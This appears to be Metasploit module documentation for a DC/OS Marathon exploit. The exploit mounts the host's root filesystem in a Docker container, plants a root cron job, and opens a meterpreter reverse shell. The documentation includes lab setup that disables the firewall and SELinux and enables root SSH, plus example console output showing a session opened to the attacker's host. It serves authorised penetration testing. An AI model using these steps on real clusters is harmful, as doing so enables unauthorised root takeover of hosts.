# Vulnerable Application
Utilizing the DCOS Cluster's Marathon UI, an attacker can create
a docker container with the '/' path mounted with read/write
permissions on the host server that is running the docker container.
As the docker container executes command as uid 0 it is honored
by the host operating system allowing the attacker to edit/create
files owed by root. This exploit abuses this to creates a cron job
in the '/etc/cron.d/' path of the host server.

*Notes: The docker image must be a valid docker image from
hub.docker.com. Further more the docker container will only
deploy if there are resources available in the DC/OS

## DCOS
This Exploit was tested with CentOS 7 as the host operating system for
the 2 services of the DCOS cluster. With DCOS version 1.7 and 1.8, with
Default 'custom' installation for on site premise setup. Only the Install
part of the DCOS guide was completed, the system hardening and securing
your cluster section where skipped. This is to represent a 'Default' install
with a system admin conducting hasty deployments taking no thought about security.


## To Setup Your Cluster
I recommend doing a 'on-premise'/custom
cluster. https://dcos.io/docs/1.8/administration/installing/custom/
Create a virtual CentOS machine, install requirements base on the above
guide.

```bash
# The TLDR from the above guide
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo yum install -y tar xz unzip curl ipset ntp
sudo systemctl start ntpd
sudo systemctl enable ntpd
sudo sed -i s/SELINUX=enforcing/SELINUX=permissive/g /etc/selinux/config && \
   sudo groupadd nogroup && sudo reboot
```

Install a supported version of docker on the CentOS systems
https://dcos.io/docs/1.8/administration/installing/custom/system-requirements/install-docker-centos/

```bash
# The TLDR of the above guide
sudo yum -y remove docker docker-common container-selinux
sudo yum -y remove docker-selinux
sudo yum install -y yum-utils
sudo yum-config-manager \
   --add-repo \
   https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repo
sudo yum-config-manager --enable docker-testing
sudo yum makecache fast
sudo yum -y install docker-engine-1.11.2
sudo systemctl start docker
sudo systemctl enable docker
sudo echo overlay > /etc/modules-load.d/overlay.conf
sudo reboot
```

Once the CentOS machine has rebooted, edit the systemctl
service file for docker and change the ExecStart- line to
`ExecStart=/usr/bin/docker daemon --storage-driver=overlay -H fd://`
restart the docker service and verify it is running.
lastly generate ssh rsa keys for authentication. And update the
/etc/ssh/sshd_config file to support root login.

```bash
ssh-keygen -t rsa -b 4096
# Press enter until complete, DO NOT PUT A PASSWORD.
cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa # save the output you will need it for later
rm ~/.ssh/id_rsa # before doing this make sure you have saved a copy for later
```

Shut down the CentOS vm, take a snapshot. (This will be your base)
clone the VM 2 times. One will be DCOS-Master, the Other DCOS-Agent.
Start the DCOS-Master and DCOS-Agent virtual machines You just cloned.
Login and get their current IP address.
* Note: I recommend giving them static IPs if you have further use for the cluster.

From here use another Linux machine with docker installed to finish
the installation process. I used an Ubuntu machine with docker installed.

Follow the custom CLI guide for creating the required files in
the genconf folder.
https://dcos.io/docs/1.8/administration/installing/custom/cli/

Example genconf/config.yaml
```
---
agent_list:
- 192.168.0.10
bootstrap_url: file:///opt/dcos_install_tmp
cluster_name: DCOS
exhibitor_storage_backend: static
ip_detect_filename: /genconf/ip-detect
master_discovery: static
master_list:
- 192.168.0.9
process_timeout: 10000
resolvers:
- 8.8.8.8
- 8.8.4.4
ssh_port: 22
ssh_user: root
```
Example genconf/ip-detect
```bash
#!/usr/bin/env bash
set -o nounset -o errexit
export PATH=/usr/sbin:/usr/bin:$PATH
ip=$(ip addr show ens33)
echo $( echo $ip | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
```

place your id_rsa ssh key into the genconf file and rename the
file to ssh_key and `chmod 0600 genconf/ssh_key`

Deploying the cluster
in the folder containing the genconf folder do the following.
NOTE: if following the cli install from DCOS itself, it will fail
if you do --install-prereqs. It will install an unsupported version of
docker.

```bash
curl -O https://downloads.dcos.io/dcos/stable/dcos_generate_config.sh
chmod +x dcos_generate_config.sh
sudo ./dcos_generate_config.sh --genconf
sudo ./dcos_generate_config.sh --preflight
# If all preflight checks pass
sudo ./dcos_generate_config.sh --deploy
# get a cup of coffie
# wait a minute or two after deploy completes
sudo bash dcos_generate_config.sh --postflight
```

If all is passing navigate to http://[master_ip]:8080/
You should see the Marathon UI web application.

# Exploitation
This module is designed for the attacker to leverage, creation of a
docker container with out authentication through the DCOS Marathon UI
to gain root access to the hosting server of the docker container
in the DCOS cluster.

## Options
- DOCKERIMAGE is the hub.docker.com docker container image you are wanting to have the DCOS Cluster to deploy for this exploit.
- TARGETURI this is the path to make the Marathon UI web request to. By default this is /v2/apps
- WAIT_TIMEOUT is how long you will wait for a docker container to deploy before bailing out if it does not start.
- CONTAINER_ID is optional if you want to have your container docker have a human readable name else it will be randomly generated

## Steps to exploit with module
- [ ] Start msfconsole
- [ ] use exploit/linux/http/dcos_marathon
- [ ] Set the options appropriately and set VERBOSE to true
- [ ] Verify it creates a docker container and it successfully runs
- [ ] After a minute a session should be opened from the agent server

## Example Output
```
msf > use exploit/linux/http/dcos_marathon
msf exploit(dcos_marathon) > set RHOST 192.168.0.9
RHOST => 192.168.0.9
msf exploit(dcos_marathon) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
msf exploit(dcos_marathon) > set LHOST 192.168.0.100
LHOST => 192.168.0.100
msf exploit(dcos_marathon) > set verbose true
verbose => true
msf exploit(dcos_marathon) > check
[*] 192.168.0.9:8080 The target appears to be vulnerable.
msf exploit(dcos_marathon) > exploit

[*] Started reverse TCP handler on 192.168.0.100:4444
[*] Setting container json request variables
[*] Creating the docker container command
[*] The docker container is created, waiting for it to deploy
[*] Waiting up to 60 seconds for docker container to start
[*] The docker container is running, removing it
[*] Waiting for the cron job to run, can take up to 60 seconds
[*] Sending stage (39690 bytes) to 192.168.0.10
[*] Meterpreter session 1 opened (192.168.0.100:4444 -> 192.168.0.10:54468) at 2017-03-01 14:22:02 -0500
[+] Deleted /etc/cron.d/FOWkTeZL
[+] Deleted /tmp/TIWpOfUR

meterpreter > sysinfo
Computer        : localhost.localdomain
OS              : Linux 3.10.0-327.36.3.el7.x86_64 #1 SMP Mon Oct 24 16:09:20 UTC 2016
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter >
```
